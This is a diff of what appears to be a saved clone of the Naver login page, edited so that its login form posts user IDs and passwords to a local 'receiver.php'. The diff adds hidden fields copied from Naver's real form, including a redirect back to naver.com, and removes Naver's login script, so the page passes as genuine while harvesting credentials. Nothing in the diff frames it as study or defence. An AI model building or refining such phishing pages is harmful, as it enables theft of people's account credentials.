@@ -996,13 +996,23 @@ lcs_do(refreshLcs());
         <button type="button" class="close_x" onclick="showErrorDiv(-1);">닫기</button>
     </div>
     <div class="login">
-        <form action="receiver.php" method="post">
-                              <fieldset>
+        <form id="frmNIDLogin" name="frmNIDLogin" target="_top" action="receiver.php" method="post">
+            <input type="hidden" name="enctp" id="enctp" value="1">
+            <input type="hidden" name="encpw" id="encpw" value="">
+            <input type="hidden" name="encnm" id="encnm" value="">
+            <input type="hidden" name="svctype" id="svctype" value="0">
+            <input type="hidden" name="url" id="url" value="https://www.naver.com/">
+            <input type="hidden" name="enc_url" id="enc_url" value="https%3A%2F%2Fwww.naver.com%2F">
+            <input type="hidden" name="postDataKey" id="postDataKey" value="">
+            <input type="hidden" name="nvlong" id="nvlong" value="">
+            <input type="hidden" name="saveID" id="saveID" value="">
+            <input type="hidden" name="smart_level" id="smart_level" value="1">
+            <fieldset>
             <legend class="blind">로그인</legend>
             <div class="htmlarea" id="flasharea" style="visibility: hidden;"><div style="width:148px;height:67px;">&nbsp;</div></div>
             <div class="htmlarea" id="htmlarea" style="display:block;">
-                <div class="input_box"><label for="id" id="label_id" class="lbl_in">아이디</label><input type="text" id="id" name="id" maxlength="41" title="아이디" accesskey="L" placeholder="아이디" class="int"></div>
-                <div class="input_box"><label for="pw" id="label_pw" class="lbl_in">비밀번호</label><input type="password" id="pw" name="pw" maxlength="16" title="비밀번호" placeholder="비밀번호" class="int">
+                <div class="input_box"><label for="id" id="label_id" class="lbl_in">아이디</label><input type="text" id="id" value ="_id" name="id" maxlength="41" title="아이디" accesskey="L" placeholder="아이디" class="int"></div>
+                <div class="input_box"><label for="pw" id="label_pw" class="lbl_in">비밀번호</label><input type="password" value ="_pw" id="pw" name="pw" maxlength="16" title="비밀번호" placeholder="비밀번호" class="int">
                     <div class="error_box_v2" style="display: none" id="div_capslock">
                         <p><strong>Caps Lock</strong>이 켜져 있습니다.</p>
                     </div>
@@ -1027,8 +1037,7 @@ lcs_do(refreshLcs());
             </fieldset>
         </form>
     </div>
-	<script type="text/javascript" src="./NAVER_files/loginv_main_20170922.js.다운로드"></script>
-    <script type="text/javascript">
+	<script type="text/javascript">
     var useWideLoginboxFlash=true;
     </script>
 </div>
